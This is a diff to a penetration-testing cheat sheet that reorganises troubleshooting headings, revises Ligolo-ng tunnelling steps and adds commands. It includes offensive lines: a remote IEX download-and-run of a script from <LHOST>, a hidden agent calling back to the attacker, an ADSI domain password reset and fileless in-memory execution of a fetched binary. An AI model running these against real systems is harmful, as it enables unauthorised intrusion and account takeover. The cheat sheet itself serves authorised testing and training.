@@ -3331,7 +3331,9 @@ $ wget -m --no-passive ftp://anonymous:anonymous@<RHOST>
 $ nmap -sC -sV -p 21 -vvv <RHOST>
 ```
 
-### Fixing 229 Entering Extended Passive Mode
+### Error Handling
+
+#### Fixing 229 Entering Extended Passive Mode
 
 ```console
 ftp> passive
@@ -3765,18 +3767,13 @@ lftp <USERNAME>@<RHOST>:~> ftp:ssl-force true
 lftp <USERNAME>@<RHOST>:~> set ssl:verify-certificate off
 ```
 
-## Ligolo
+## Ligolo-ng
 
 > https://github.com/nicocha30/ligolo-ng
 
 ### Download Proxy and Agent
 
 > https://github.com/nicocha30/ligolo-ng/releases
-
-```console
-$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
-$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
-```
 
 ### Prepare Tunnel Interface
 
@@ -3829,6 +3826,44 @@ $ sudo ip route add 240.0.0.1/32 dev ligolo
 ```console
 [Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
 [Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
+```
+
+### Alternative Session Configuration
+
+#### Setup Proxy on Attacker Machine
+
+```console
+$ sudo ./proxy -selfcert
+```
+
+#### Prepare Tunnel Interface
+
+```console
+ligolo-ng » ifcreate --name ligolo
+```
+
+#### Add Route to Tunnel Interface
+
+```console
+ligolo-ng » route_add --name ligolo --route <SUBNET>
+```
+
+#### Setup Agent on Target Machine
+
+```cmd
+PS C:\> Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect <LHOST>:11601 -ignore-cert" -WindowStyle Hidden
+```
+
+### Error Handling
+
+#### Fixing tun.New device or resource busy
+
+```console
+$ sudo ip link delete ligolo
+```
+
+```console
+[Agent : user@target] » start
 ```
 
 ## Linux
@@ -5041,6 +5076,14 @@ PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<
 PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
 ```
 
+#### Set User Password via Active Directory Service Interfaces (ADSI)
+
+```cmd
+PS C:\> $user = [adsi]"LDAP://CN=<USERNAME>,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>"
+PS C:\> $user.SetPassword('<PASSWORD>')
+PS C:\> $user.SetInfo()
+```
+
 #### New-PSSession
 
 ```cmd
@@ -5261,16 +5304,18 @@ $ python -c 'print "\x41"'
 $ python3 -m websockets ws://<DOMAIN>
 ```
 
-### Fixing Crypto Error
-
-```console
-$ pip install pycryptodome
-```
-
 ### Running Binaries without touching Disk
 
 ```console
 $ python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("<TEXT>"); os.write(fd, http://d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p, "-h"],{})'
+```
+
+### Error Handling
+
+#### Fixing Crypto Error
+
+```console
+$ pip install pycryptodome
 ```
 
 ## Python TOTP
@@ -5769,7 +5814,9 @@ $ squidclient -h <RHOST> -w '<PASSWORD>' mgr:fqdncache
 
 ## SSH
 
-### Fixing SSH Private Key
+### Error Handling
+
+#### Fixing SSH Private Key
 
 ```console
 $ dos2unix id_rsa
@@ -6048,6 +6095,8 @@ $ sudo rdate -s <RHOST>
 #### timedatectl
 
 ```console
+$ sudo timedatectl show
+$ sudo timedatectl set-ntp false
 $ sudo timedatectl set-timezone UTC
 $ sudo timedatectl list-timezones
 $ sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
